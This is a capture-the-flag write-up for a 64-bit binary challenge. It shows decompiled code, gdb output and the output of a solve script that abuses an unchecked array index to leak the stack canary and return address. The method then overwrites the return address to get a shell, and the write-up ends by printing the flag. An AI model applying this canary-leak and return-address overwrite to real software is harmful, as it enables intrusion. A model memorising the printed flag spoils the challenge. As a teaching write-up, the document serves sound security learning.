# Real Baby Pwnable
Pwn

## Challenge 
> This is an actual baby pwn challenge.

>`nc ctf.pwn.sg 1500`

>Creator - amon (@nn_amon)

> [realbabypwn](realbabypwn)

## Solution

### Understanding the code

Decompile in Hopper

	void babymode() {
	    system("/bin/sh");
	    return;
	}

    ; Variables:
    ;    var_8: -8
    ;    var_110: -272
    ;    var_908: -2312
    ;    var_910: -2320
    ;    var_914: -2324
    ;    var_918: -2328
    ;    var_919: -2329

	int fibonacci() {
	    var_8 = *0x28;
	    rax = 0x0;
	    var_910 = 0x0;
	    var_908 = 0x1;

	    // Let buf == rbp + 0xfffffffffffff6f0
	    // for buf[8 * 2] to buf[8 * 255]

	    for (var_914 = 0x2; var_914 <= 0xff; var_914 = var_914 + 0x1) {
	            // *(rbp + sign_extend_32(var_914) * 0x8 + 0xfffffffffffff6f0) = *(rbp + sign_extend_32(var_914 - 0x1) * 0x8 + 0xfffffffffffff6f0) + *(rbp + sign_extend_32(var_914 - 0x2) * 0x8 + 0xfffffffffffff6f0);

	            buf[var_914 * 8] = buf[(var_914-1) * 8] + buf[(var_914-2) * 8]
	    }

	    while ((var_919 & 0xff) != 'n') {
	            rax = 0x0;
	            rax = printf("Which fibbonacci offset did you want to look up? ");
	            rax = 0x0;
	            rax = __isoc99_scanf("%d", &var_918);
	            rax = 0x0;
	            rax = printf("Fibbonaci Number %d: %lu\n", var_918, 
	            			buf[(var_918) * 0x8]);
	            rax = 0x0;
	            rax = printf("Want to learn another Fibbonaci number? (y/n) ");
	            rax = 0x0;
	            rax = __isoc99_scanf("%s", &var_919);
	    }
	    rax = 0x0;
	    rax = printf("Did you learn anything? ");
	    rax = read(0x0, &var_110, 0x200); // 512 byte buffer
	    return rax;
	}

It basically has 64-bit array of fibbonacci numbers.

However, there's no input validation so we can read the values on the stack above the array

### Forming the attack

#### 1. Find address

	# gdb ./realbabypwn 

	(gdb) info add babymode
	Symbol "babymode" is at 0x9b0 in a file compiled without debugging.
	(gdb) info add fibonacci
	Symbol "fibonacci" is at 0x9c3 in a file compiled without debugging.
	(gdb) info add main     
	Symbol "main" is at 0xb21 in a file compiled without debugging.
	
	(gdb) run
	
	(gdb) break main
	Breakpoint 1 at 0x555555554b25
	(gdb) break fibonacci
	Breakpoint 2 at 0x5555555549c7
	(gdb) break babymode 
	Breakpoint 3 at 0x5555555549b4

Not an expert at this, but it seems like enabled ASLR.

#### 2. Find address

So we know that the fibbonacci offset starts at `var_910` or -2320
And the buffer for the read() is at `var_110` or -272


The `var_8` seems to be some sort of canary.
Also, after trying some random payloads, we get

	 *** stack smashing detected ***: <unknown> terminated

This confirms that a canary is present.


#### 3. Gather the stack

Thankfully, we can read any addresses using the fibonacci() loop.

With this, We can accumulate all the canary values from offset -272 to 0.

And override the return address at offset 8 and 16 (we can calculate the address by utilising the original return address at offset 8)

Unfortunately, the read() fiunction adds in a null byte which will "stack smash" the canary at offset 24. Hence, include it inside for the payload.

	$ python2 solve.py

	[+] Opening connection to ctf.pwn.sg on port 1500: Done
	>> offset -280 (255): 0x1bed585606b77ee2
	>> offset -272 (256): 0x0
	>> offset -264 (257): 0x0
	>> offset -256 (258): 0x0
	>> offset -248 (259): 0x0
	>> offset -240 (260): 0x0
	>> offset -232 (261): 0x0
	>> offset -224 (262): 0x0
	>> offset -216 (263): 0x0
	>> offset -208 (264): 0x0
	>> offset -200 (265): 0x0
	>> offset -192 (266): 0x0
	>> offset -184 (267): 0x0
	>> offset -176 (268): 0x0
	>> offset -168 (269): 0x0
	>> offset -160 (270): 0x0
	>> offset -152 (271): 0x0
	>> offset -144 (272): 0x0
	>> offset -136 (273): 0x0
	>> offset -128 (274): 0x0
	>> offset -120 (275): 0x7f0146ef5680
	>> offset -112 (276): 0x0
	>> offset -104 (277): 0x7f0146b978a2
	>> offset -96 (278): 0x0
	>> offset -88 (279): 0x7f0146ef5680
	>> offset -80 (280): 0x0
	>> offset -72 (281): 0x0
	>> offset -64 (282): 0x7f0146ef12a0
	>> offset -56 (283): 0x7f0146b93859
	>> offset -48 (284): 0x7f0146ef5680
	>> offset -40 (285): 0x7f0146b8a405
	>> offset -32 (286): 0x7f0146f0a9a0
	>> offset -24 (287): 0x0
	>> offset -16 (288): 0x7ffc45ec3f30
	>> offset -8 (289): 0x873aadd206b4c400
	>> offset 0 (290): 0x7ffc45ec3f30
	>> offset 8 (291): 0x562083d5cb92
	>> offset 16 (292): 0x562083d5cba0
	>> offset 24 (293): 0x7f0146b2ab97
	>> offset 32 (294): 0x0
	[*] Switching to interactive mode
	 $ ls
	bin
	boot
	dev
	etc
	home
	lib
	lib64
	media
	mnt
	opt
	proc
	root
	run
	sbin
	srv
	sys
	tmp
	usr
	var

	$ cd home

	$ ls -la
	total 12
	drwxr-xr-x 1 root root            4096 May 19 00:51 .
	drwxr-xr-x 1 root root            4096 May 19 06:59 ..
	drwxr-x--- 1 root realbabypwnuser 4096 May 19 00:51 realbabypwnuser
	
	$ ls real*
	flag
	realbabypwn

	$ cat real*/flag
	CrossCTF{It3r4t1ve_0ver_R3curs1v3}

## Flag

	CrossCTF{It3r4t1ve_0ver_R3curs1v3}
